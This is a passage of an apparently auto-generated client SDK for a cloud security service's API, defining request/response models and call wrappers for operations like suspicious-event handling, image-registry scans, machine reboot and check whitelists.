    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVuls(request: OperateVulsRequest): OperateVulsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVulsWithOptions(request, runtime);
}

model OperateWebLockFileEventsRequest {
  dealAll?: int32(name='DealAll'),
  eventIds?: [ long ](name='EventIds'),
  operationCode?: string(name='OperationCode'),
}

model OperateWebLockFileEventsResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateWebLockFileEventsResponseBody(name='body'),
}

async function operateWebLockFileEventsWithOptions(request: OperateWebLockFileEventsRequest, runtime: Util.RuntimeOptions): OperateWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.eventIds)) {
    query['EventIds'] = request.eventIds;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateWebLockFileEvents(request: OperateWebLockFileEventsRequest): OperateWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateWebLockFileEventsWithOptions(request, runtime);
}

model OperationCancelIgnoreSuspEventRequest {
  securityEventIds?: [ long ](name='SecurityEventIds'),
}

model OperationCancelIgnoreSuspEventResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  timeCost?: long(name='TimeCost'),
}

model OperationCancelIgnoreSuspEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationCancelIgnoreSuspEventResponseBody(name='body'),
}

async function operationCancelIgnoreSuspEventWithOptions(request: OperationCancelIgnoreSuspEventRequest, runtime: Util.RuntimeOptions): OperationCancelIgnoreSuspEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationCancelIgnoreSuspEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationCancelIgnoreSuspEvent(request: OperationCancelIgnoreSuspEventRequest): OperationCancelIgnoreSuspEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationCancelIgnoreSuspEventWithOptions(request, runtime);
}

model OperationSuspEventsRequest {
  from?: string(name='From'),
  operation?: string(name='Operation'),
  sourceIp?: string(name='SourceIp'),
  subOperation?: string(name='SubOperation'),
  suspiciousEventIds?: string(name='SuspiciousEventIds'),
  warnType?: string(name='WarnType'),
}

model OperationSuspEventsResponseBody = {
  accessCode?: string(name='AccessCode'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model OperationSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationSuspEventsResponseBody(name='body'),
}

async function operationSuspEventsWithOptions(request: OperationSuspEventsRequest, runtime: Util.RuntimeOptions): OperationSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.subOperation)) {
    query['SubOperation'] = request.subOperation;
  }
  if (!Util.isUnset(request.suspiciousEventIds)) {
    query['SuspiciousEventIds'] = request.suspiciousEventIds;
  }
  if (!Util.isUnset(request.warnType)) {
    query['WarnType'] = request.warnType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationSuspEvents(request: OperationSuspEventsRequest): OperationSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationSuspEventsWithOptions(request, runtime);
}

model PageImageRegistryRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  registryNameLike?: string(name='RegistryNameLike'),
  registryTypeInList?: [ string ](name='RegistryTypeInList'),
  registryTypeNotInList?: [ string ](name='RegistryTypeNotInList'),
  sourceIp?: string(name='SourceIp'),
}

model PageImageRegistryResponseBody = {
  list?: [ 
    {
      blackList?: string(name='BlackList'),
      domainName?: string(name='DomainName'),
      gmtCreate?: string(name='GmtCreate'),
      gmtModified?: string(name='GmtModified'),
      id?: long(name='Id'),
      imageCount?: int32(name='ImageCount'),
      jenkinsEnv?: string(name='JenkinsEnv'),
      netType?: int32(name='NetType'),
      password?: string(name='Password'),
      persistenceDay?: int32(name='PersistenceDay'),
      protocolType?: int32(name='ProtocolType'),
      regionId?: string(name='RegionId'),
      registryHostIp?: string(name='RegistryHostIp'),
      registryName?: string(name='RegistryName'),
      registryType?: string(name='RegistryType'),
      token?: string(name='Token'),
      transPerHour?: int32(name='TransPerHour'),
      userName?: string(name='UserName'),
      vpcId?: string(name='VpcId'),
      whiteList?: string(name='WhiteList'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model PageImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PageImageRegistryResponseBody(name='body'),
}

async function pageImageRegistryWithOptions(request: PageImageRegistryRequest, runtime: Util.RuntimeOptions): PageImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.registryNameLike)) {
    body['RegistryNameLike'] = request.registryNameLike;
  }
  if (!Util.isUnset(request.registryTypeInList)) {
    body['RegistryTypeInList'] = request.registryTypeInList;
  }
  if (!Util.isUnset(request.registryTypeNotInList)) {
    body['RegistryTypeNotInList'] = request.registryTypeNotInList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'PageImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pageImageRegistry(request: PageImageRegistryRequest): PageImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return pageImageRegistryWithOptions(request, runtime);
}

model PauseClientRequest {
  uuids?: string(name='Uuids'),
  value?: string(name='Value'),
}

model PauseClientResponseBody = {
  requestId?: string(name='RequestId'),
}

model PauseClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PauseClientResponseBody(name='body'),
}

async function pauseClientWithOptions(request: PauseClientRequest, runtime: Util.RuntimeOptions): PauseClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PauseClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pauseClient(request: PauseClientRequest): PauseClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return pauseClientWithOptions(request, runtime);
}

model PublicCreateImageScanTaskRequest {
  digests?: string(name='Digests'),
  instanceIds?: string(name='InstanceIds'),
  regionIds?: string(name='RegionIds'),
  registryTypes?: string(name='RegistryTypes'),
  repoIds?: string(name='RepoIds'),
  repoNames?: string(name='RepoNames'),
  repoNamespaces?: string(name='RepoNamespaces'),
  sourceIp?: string(name='SourceIp'),
  tags?: string(name='Tags'),
}

model PublicCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate'),
    collectTime?: long(name='CollectTime'),
    execTime?: long(name='ExecTime'),
    finishCount?: int32(name='FinishCount'),
    progress?: int32(name='Progress'),
    result?: string(name='Result'),
    status?: string(name='Status'),
    taskId?: string(name='TaskId'),
    totalCount?: int32(name='TotalCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model PublicCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicCreateImageScanTaskResponseBody(name='body'),
}

async function publicCreateImageScanTaskWithOptions(request: PublicCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicCreateImageScanTask(request: PublicCreateImageScanTaskRequest): PublicCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicCreateImageScanTaskWithOptions(request, runtime);
}

model PublicPreCheckImageScanTaskRequest {
  digests?: string(name='Digests'),
  instanceIds?: string(name='InstanceIds'),
  regionIds?: string(name='RegionIds'),
  registryTypes?: string(name='RegistryTypes'),
  repoIds?: string(name='RepoIds'),
  repoNames?: string(name='RepoNames'),
  repoNamespaces?: string(name='RepoNamespaces'),
  sourceIp?: string(name='SourceIp'),
  tags?: string(name='Tags'),
}

model PublicPreCheckImageScanTaskResponseBody = {
  data?: {
    needAuthCount?: int32(name='NeedAuthCount'),
    scanImageCount?: int32(name='ScanImageCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model PublicPreCheckImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicPreCheckImageScanTaskResponseBody(name='body'),
}

async function publicPreCheckImageScanTaskWithOptions(request: PublicPreCheckImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicPreCheckImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicPreCheckImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicPreCheckImageScanTask(request: PublicPreCheckImageScanTaskRequest): PublicPreCheckImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicPreCheckImageScanTaskWithOptions(request, runtime);
}

model PublicSyncAndCreateImageScanTaskRequest {
  images?: string(name='Images'),
  sourceIp?: string(name='SourceIp'),
}

model PublicSyncAndCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate'),
    collectTime?: long(name='CollectTime'),
    execTime?: long(name='ExecTime'),
    finishCount?: int32(name='FinishCount'),
    progress?: int32(name='Progress'),
    result?: string(name='Result'),
    status?: string(name='Status'),
    taskId?: string(name='TaskId'),
    totalCount?: int32(name='TotalCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model PublicSyncAndCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicSyncAndCreateImageScanTaskResponseBody(name='body'),
}

async function publicSyncAndCreateImageScanTaskWithOptions(request: PublicSyncAndCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicSyncAndCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.images)) {
    query['Images'] = request.images;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicSyncAndCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicSyncAndCreateImageScanTask(request: PublicSyncAndCreateImageScanTaskRequest): PublicSyncAndCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicSyncAndCreateImageScanTaskWithOptions(request, runtime);
}

model QueryDiscoverDatabaseRequest {
  createMark?: string(name='CreateMark'),
}

model QueryDiscoverDatabaseResponseBody = {
  requestId?: string(name='RequestId'),
  taskProgress?: int32(name='TaskProgress'),
}

model QueryDiscoverDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryDiscoverDatabaseResponseBody(name='body'),
}

async function queryDiscoverDatabaseWithOptions(request: QueryDiscoverDatabaseRequest, runtime: Util.RuntimeOptions): QueryDiscoverDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.createMark)) {
    query['CreateMark'] = request.createMark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryDiscoverDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryDiscoverDatabase(request: QueryDiscoverDatabaseRequest): QueryDiscoverDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryDiscoverDatabaseWithOptions(request, runtime);
}

model QueryGroupIdByGroupNameRequest {
  groupName?: string(name='GroupName'),
  sourceIp?: string(name='SourceIp'),
}

model QueryGroupIdByGroupNameResponseBody = {
  groupId?: long(name='GroupId'),
  requestId?: string(name='RequestId'),
}

model QueryGroupIdByGroupNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupIdByGroupNameResponseBody(name='body'),
}

async function queryGroupIdByGroupNameWithOptions(request: QueryGroupIdByGroupNameRequest, runtime: Util.RuntimeOptions): QueryGroupIdByGroupNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupIdByGroupName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryGroupIdByGroupName(request: QueryGroupIdByGroupNameRequest): QueryGroupIdByGroupNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupIdByGroupNameWithOptions(request, runtime);
}

model QueryGroupedSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage'),
  disposalWay?: string(name='DisposalWay'),
  eventName?: string(name='EventName'),
  from?: string(name='From'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
}

model QueryGroupedSecurityEventMarkMissListResponseBody = {
  code?: string(name='Code'),
  list?: [ 
    {
      aliUid?: long(name='AliUid'),
      disposalWay?: string(name='DisposalWay'),
      eventName?: string(name='EventName'),
      eventNameOriginal?: string(name='EventNameOriginal'),
      eventType?: string(name='EventType'),
      eventTypeOriginal?: string(name='EventTypeOriginal'),
      field?: string(name='Field'),
      fieldValue?: string(name='FieldValue'),
      filedAliasName?: string(name='FiledAliasName'),
      operate?: string(name='Operate'),
      uuids?: string(name='Uuids'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model QueryGroupedSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupedSecurityEventMarkMissListResponseBody(name='body'),
}

async function queryGroupedSecurityEventMarkMissListWithOptions(request: QueryGroupedSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): QueryGroupedSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.disposalWay)) {
    query['DisposalWay'] = request.disposalWay;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    body['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    body['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupedSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryGroupedSecurityEventMarkMissList(request: QueryGroupedSecurityEventMarkMissListRequest): QueryGroupedSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupedSecurityEventMarkMissListWithOptions(request, runtime);
}

model QueryJenkinsImageRegistryPersistenceDayRequest {
  sourceIp?: string(name='SourceIp'),
}

model QueryJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: int32(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  timeCost?: long(name='TimeCost'),
}

model QueryJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function queryJenkinsImageRegistryPersistenceDayWithOptions(request: QueryJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): QueryJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryJenkinsImageRegistryPersistenceDay(request: QueryJenkinsImageRegistryPersistenceDayRequest): QueryJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model QueryPreCheckDatabaseRequest {
  instanceUuid?: string(name='InstanceUuid'),
  taskId?: string(name='TaskId'),
  uniRegionId?: string(name='UniRegionId'),
}

model QueryPreCheckDatabaseResponseBody = {
  completedTime?: long(name='CompletedTime'),
  createdTime?: long(name='CreatedTime'),
  description?: string(name='Description'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  result?: string(name='Result'),
  updatedTime?: long(name='UpdatedTime'),
}

model QueryPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryPreCheckDatabaseResponseBody(name='body'),
}

async function queryPreCheckDatabaseWithOptions(request: QueryPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): QueryPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryPreCheckDatabase(request: QueryPreCheckDatabaseRequest): QueryPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryPreCheckDatabaseWithOptions(request, runtime);
}

model RebootMachineRequest {
  uuid?: string(name='Uuid'),
}

model RebootMachineResponseBody = {
  requestId?: string(name='RequestId'),
}

model RebootMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RebootMachineResponseBody(name='body'),
}

async function rebootMachineWithOptions(request: RebootMachineRequest, runtime: Util.RuntimeOptions): RebootMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RebootMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rebootMachine(request: RebootMachineRequest): RebootMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return rebootMachineWithOptions(request, runtime);
}

model RefreshAssetsRequest {
  assetType?: string(name='AssetType'),
  cloudAssetSubType?: int32(name='CloudAssetSubType'),
  cloudAssetType?: int32(name='CloudAssetType'),
}

model RefreshAssetsResponseBody = {
  requestId?: string(name='RequestId'),
}

model RefreshAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshAssetsResponseBody(name='body'),
}

async function refreshAssetsWithOptions(request: RefreshAssetsRequest, runtime: Util.RuntimeOptions): RefreshAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetSubType)) {
    query['CloudAssetSubType'] = request.cloudAssetSubType;
  }
  if (!Util.isUnset(request.cloudAssetType)) {
    query['CloudAssetType'] = request.cloudAssetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshAssets(request: RefreshAssetsRequest): RefreshAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshAssetsWithOptions(request, runtime);
}

model RefreshContainerAssetsRequest {
  assetType?: string(name='AssetType'),
}

model RefreshContainerAssetsResponseBody = {
  requestId?: string(name='RequestId'),
}

model RefreshContainerAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshContainerAssetsResponseBody(name='body'),
}

async function refreshContainerAssetsWithOptions(request: RefreshContainerAssetsRequest, runtime: Util.RuntimeOptions): RefreshContainerAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshContainerAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshContainerAssets(request: RefreshContainerAssetsRequest): RefreshContainerAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshContainerAssetsWithOptions(request, runtime);
}

model RemoveCheckInstanceResultWhiteListRequest {
  checkId?: long(name='CheckId'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model RemoveCheckInstanceResultWhiteListResponseBody = {
  requestId?: string(name='RequestId'),
}

model RemoveCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function removeCheckInstanceResultWhiteListWithOptions(request: RemoveCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckInstanceResultWhiteList(request: RemoveCheckInstanceResultWhiteListRequest): RemoveCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model RemoveCheckResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId'),
  checkIds?: [ long ](name='CheckIds'),
  type?: string(name='Type'),
}

model RemoveCheckResultWhiteListResponseBody = {
  code?: string(name='Code'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model RemoveCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckResultWhiteListResponseBody(name='body'),
}

async function removeCheckResultWhiteListWithOptions(request: RemoveCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
